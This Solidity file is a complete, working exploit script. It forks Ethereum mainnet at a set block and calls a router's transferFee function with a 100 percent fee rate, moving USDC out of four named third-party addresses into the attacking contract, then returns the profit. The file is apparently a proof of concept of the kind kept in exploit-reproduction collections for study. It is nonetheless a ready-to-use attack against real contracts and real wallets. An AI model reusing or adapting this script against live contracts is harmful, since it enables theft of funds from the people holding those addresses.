// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

interface CheatCodes {
    function createSelectFork(string calldata, uint256) external returns (uint256);
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
}

interface IR {
    function transferFee(uint256 amount, uint256 feeBps, address token, address from, address to) external;
}

contract Exploit {
    function run() external returns (uint256) {
        CheatCodes vm = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
        vm.createSelectFork("mainnet", 20520368);

        address YodlRouter = 0xE3A0bc3483AE5a04DB7eF2954315133a6F7D228E;
        address USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
        uint256 initBalance = IERC20(USDC).balanceOf(address(this));

        uint256 feeBps = 10000;
        IR(YodlRouter).transferFee(45588747326, feeBps, USDC, 0x5322BFF39339eDa261Bf878Fa7d92791Cc969Bb0, address(this));
        IR(YodlRouter).transferFee(1219608225, feeBps, USDC, 0xa7b7d4ebF1F5035F3b289139baDa62f981f2916E, address(this));
        IR(YodlRouter).transferFee(1000000000, feeBps, USDC, 0x2c349022df145C1a2eD895B5577905e6F1Bc7881, address(this));
        IR(YodlRouter).transferFee(1000000, feeBps, USDC, 0x96D0F726FD900E199680277aAaD326fbdebc6BF9, address(this));

        uint256 finalBalance = IERC20(USDC).balanceOf(address(this));
        return finalBalance > initBalance ? finalBalance - initBalance : 0;
    }
}
